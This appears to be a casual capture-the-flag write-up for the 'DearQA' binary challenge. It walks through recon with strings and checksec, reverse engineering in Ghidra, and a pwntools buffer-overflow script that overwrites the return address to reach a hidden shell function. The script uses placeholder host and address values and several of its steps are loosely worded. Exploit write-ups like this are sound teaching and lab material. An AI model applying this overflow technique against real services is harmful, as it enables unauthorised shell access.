# DearQA

## Gather Infomation (OSINIT)
first we what to gather infomation as much as possible from this binary 

1. First clue the binary is not stripped and it an x86_64 ELF binary 
![alt text](image/file.png)
2. Second clue string give us some clue about this program at some point we might able to entract with shell as we saw /bin/bash and it want us to input a some kind of password
![alt text](image/string.png)
3. Third clue tell us that binary have ALSR disable and Canary also disable which mean the address doesen't changes this mean we can write a value into and do some evil stuff >:) 
![alt text](image/checksec.png)

## Program Controll flow (Reverse Engineering)
after you open a open a ghidra or ida you will some odd fucntion in main it look normal but look eye emoji the there a function that call for shell exe ? what that crazy 
but buffer also don't have a lenght check ether let exploite this >:)
![alt text](image/ghidra1.png)
![alt text](image/ghidra2.png)

## Crafting exploite  
run objdump -d binary will give us a function address we need to hyjack you can do this yourself in gdb but i want you guy to do it yourself if you want to explore do it and you will learn alot more 

anyway we connect to the server with this code 
```
from pwn import *

# enter the right infomation from your room or challenge
HOST = 'hostname'
PORT = 80085  

# connect to the sever
r = remote(HOST, PORT)

# craft an evail payload
target = 0xtarget
payload = b'A' * 40
payload += p64(target)

# now send it >:)
r.sendlineafter(b': ', payload)
r.interactive()


```
## Congrate you a hacker :3

